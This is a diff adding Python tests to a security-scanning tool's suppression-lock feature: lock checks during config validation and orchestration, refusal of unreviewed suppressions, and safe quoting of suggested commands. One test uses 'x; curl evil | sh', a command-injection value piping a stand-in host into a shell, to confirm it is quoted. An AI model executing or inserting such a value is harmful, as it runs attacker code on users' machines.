@@ -229,6 +229,100 @@ class TestRefusalWithoutALockEntry:
         _lock(root, LockScope("B602", "risky"))
         assert ConfigValidator.check_config_file(config, source_dir=root).scan_accepts
 
+    def test_config_validate_without_a_source_dir_still_checks_the_lock(
+        self, tmp_path, monkeypatch
+    ):
+        # MCP validate_config and validate_and_raise call check_config_file
+        # with no source_dir; skipping the lock check there answered
+        # ``valid: True`` for a config a scan refuses. The lock root falls
+        # back to the root the config's location implies (out of ``.ash/``).
+        from automated_security_helper.config.config_validator import ConfigValidator
+
+        monkeypatch.delenv("ASH_CONFIG", raising=False)
+        root = _tree(tmp_path)
+        config = _config_text(root, SYMBOL_ENTRY)
+        check = ConfigValidator.check_config_file(config)
+        assert not check.scan_accepts
+        assert any("ash suppress add" in e for e in check.errors), check.errors
+        _lock(root, LockScope("B602", "risky"))
+        after = ConfigValidator.check_config_file(config)
+        assert not any("ash suppress add" in e for e in after.errors), after.errors
+
+    def test_an_unrecorded_scope_on_a_locked_file_is_refused(self, tmp_path):
+        # The entry alone is not enough: once src/app.py was locked for
+        # B602/risky, a suppression hand-added to the same file (another rule,
+        # a broader symbol) was never reviewed, and without this it applied
+        # silently and refresh re-approved it unseen.
+        root = _tree(tmp_path)
+        _lock(root, LockScope("B602", "risky"))
+        refuse_unlocked_symbol_suppressions([_symbol_suppression()], root)
+        # Rule ids match case-insensitively everywhere, the scope lookup too.
+        refuse_unlocked_symbol_suppressions(
+            [
+                AshSuppression(
+                    rule_id="b602", path="src/app.py", symbol="risky", reason="r"
+                )
+            ],
+            root,
+        )
+        for rule_id, symbol in (("B605", "risky"), ("B602", "other")):
+            with pytest.raises(ASHConfigValidationError, match="ash suppress add"):
+                refuse_unlocked_symbol_suppressions(
+                    [
+                        AshSuppression(
+                            rule_id=rule_id,
+                            path="src/app.py",
+                            symbol=symbol,
+                            reason="r",
+                        )
+                    ],
+                    root,
+                )
+
+    def test_the_orchestrator_refuses_a_caller_resolved_config_too(self, tmp_path):
+        # A workspace project hands the orchestrator a resolved config, which
+        # skips resolve_scan_config and so skipped the refusal: a workspace-mode
+        # scan ran an unrecorded symbol suppression where `ash scan` refused it.
+        from automated_security_helper.core.orchestrator import ASHScanOrchestrator
+
+        root = _tree(tmp_path)
+        config = AshConfig(project_name="t", fail_on_findings=False)
+        config.global_settings.suppressions = [_symbol_suppression()]
+        orchestrator = ASHScanOrchestrator(
+            source_dir=root, output_dir=tmp_path / "out", resolved_config=config
+        )
+        with pytest.raises(ASHConfigValidationError, match="ash suppress add"):
+            orchestrator._initialize()
+        _lock(root, LockScope("B602", "risky"))
+        orchestrator._initialize()
+
+    def test_the_suggested_command_quotes_what_the_config_controls(self):
+        import shlex
+
+        from automated_security_helper.utils.ash_lock import add_command_for
+
+        command = add_command_for("B602", "Handler.run", "x; curl evil | sh")
+        parts = shlex.split(command)
+        assert "x; curl evil | sh" in parts
+        assert parts[:3] == ["ash", "suppress", "add"]
+        plain = add_command_for("B602", "risky", "src/app.py")
+        assert "ash suppress add B602 --symbol risky --file src/app.py" in plain
+
+    def test_a_missing_entry_is_advised_the_drop_and_a_stale_one_the_refresh(
+        self, tmp_path
+    ):
+        from automated_security_helper.utils.ash_lock import stale_notice
+
+        root = _tree(tmp_path)
+        lock = _lock(root, LockScope("B602", "risky"))
+        entry = lock.entries["src/app.py"]
+        missing = stale_notice("src/app.py", entry, "missing")
+        assert "ash suppress refresh --drop-missing src/app.py" in missing
+        assert "reported again" not in missing
+        stale = stale_notice("src/app.py", entry, "stale")
+        assert "ash suppress refresh src/app.py" in stale
+        assert "--drop-missing" not in stale
+
     def test_a_damaged_lock_is_refused_not_read_as_empty(self, tmp_path):
         root = _tree(tmp_path)
         lock_path = root / LOCK_RELATIVE_PATH
@@ -414,6 +508,9 @@ class TestTheLockIsTheRootDotfile:
         assert len(notices) == 1, notices
         assert ".ash/ash.lock" in notices[0] and "v4.0" in notices[0]
         assert "git mv .ash/ash.lock .ash.lock" in notices[0]
+        # The move alone: advising `ash suppress refresh` here re-approved
+        # every unreviewed change in a stale legacy lock in one step.
+        assert "refresh" not in notices[0]
 
     def test_saving_a_legacy_lock_writes_the_root_file_and_leaves_the_old_one(
         self, tmp_path
